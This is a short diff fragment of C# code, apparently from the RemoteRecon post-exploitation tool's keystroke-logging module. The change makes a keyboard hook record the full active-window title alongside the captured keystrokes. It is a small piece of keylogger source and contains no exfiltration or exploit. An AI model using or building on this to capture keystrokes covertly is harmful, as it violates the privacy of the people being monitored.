@@ -129,7 +129,7 @@ namespace RemoteReconKS
 
             //Check to see if the window has changed
             if (oldWndTxt.ToLower() != wndText.ToString().ToLower())
-                modKey.Append(" \r\n{" + wndText.ToString().Split('-')[0] + "}\r\n ");
+                modKey.Append(" \r\n{" + wndText.ToString() + "}\r\n ");
 
             if (nCode >= 0 && (wParam == (IntPtr)WinApi.WM_KEYDOWN || wParam == (IntPtr)WinApi.WM_SYSKEYDOWN))
             {
